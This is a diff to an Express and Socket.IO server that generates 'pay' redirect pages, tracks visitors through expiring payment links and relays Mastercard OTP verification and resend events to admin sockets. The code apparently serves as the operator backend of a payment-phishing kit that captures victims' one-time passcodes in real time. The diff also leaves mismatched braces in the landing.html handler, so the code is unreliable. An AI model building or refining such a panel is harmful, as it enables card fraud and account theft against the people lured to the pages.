@@ -29,6 +29,7 @@ const expiredLinks = new Set();
 // Track admin sockets separately
 const adminSockets = new Set();
 
+// Create HTML redirect files
 function createRedirectFile(targetHtml) {
   try {
     const fileName = `pay${SERVER_ID}.html`;
@@ -52,24 +53,21 @@ function createRedirectFile(targetHtml) {
     return fileName;
   } catch (error) {
     console.error(`Failed to create redirect file: ${error.message}`);
-    // Return a fallback file name - this will use index.html as fallback
+    // Return a fallback file name
     return 'index.html';
   }
 }
+
 // Create a redirect file for landing.html
 const PAYMENT_REDIRECT_FILE = createRedirectFile('landing.html');
 
-// First define the app
+// Initialize Express app
 const app = express();
-// Configure middleware
 app.use(bodyParser.json());
-app.use(cors({/* config */}));
-// Define routes
-app.get('/', (req, res) => { /* ... */ });
-// THEN initialize the server
-const server = app.listen(PORT, () => { /* ... */ });
-// ONLY AFTER THAT initialize Socket.io
-const io = new Server(server, {/* config */});
+app.use(cors({
+  origin: '*',
+  methods: ['GET', 'POST']
+}));
 
 // Helper function to get payment ID from URL
 function getPaymentIdFromUrl(url) {
@@ -387,7 +385,7 @@ function cleanupInactiveVisitors() {
   }
 }
 
-// Add a health check route at the top of your routes
+// Add a health check route
 app.get('/health', (req, res) => {
   res.send({
     status: 'ok',
@@ -396,7 +394,7 @@ app.get('/health', (req, res) => {
   });
 });
 
-// Serve static files
+// Serve static files with absolute path
 app.use(express.static(path.join(__dirname, '.')));
 
 // Add fallback for landing.html
@@ -407,8 +405,10 @@ app.get('/landing.html', (req, res, next) => {
         if (err) {
             console.log('landing.html not found, serving index.html as fallback');
             res.sendFile(path.join(__dirname, 'index.html'));
-        } else {
-            next(); // Continue to static file handling
+        }
+      else {
+                next(); // Continue to static file handling
+            }
         }
     });
 });
@@ -448,7 +448,8 @@ app.get('/api/getTransactionPid', (req, res) => {
   
   res.json({ pid });
 });
-// Add this at the end of your routes, before starting the server
+
+// Add root route handler
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -907,7 +908,7 @@ app.post('/api/clearTransactions', (req, res) => {
   }
 });
 
-// Start server - SINGLE DEFINITION - Don't redefine server anywhere else
+// Start server - PROPERLY DEFINED ONLY ONCE
 const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
@@ -928,7 +929,7 @@ const server = app.listen(PORT, () => {
   setInterval(cleanupInactiveVisitors, 10000); // Check every 10 seconds
 });
 
-// Initialize Socket.IO - SINGLE DEFINITION - Don't redefine io anywhere else
+// Initialize Socket.IO - PROPERLY DEFINED ONLY ONCE
 const io = new Server(server, {
   cors: {
     origin: "*",
@@ -1158,7 +1159,7 @@ io.on('connection', (socket) => {
     io.to(data.invoiceId).emit('mc_verification_result', data);
   });
 
-  socket.on('mc_resend_otp', (data) => {
+ socket.on('mc_resend_otp', (data) => {
     // Notify admin panel of OTP resend request
     console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
     broadcastToAdmins('mc_resend_otp', data);
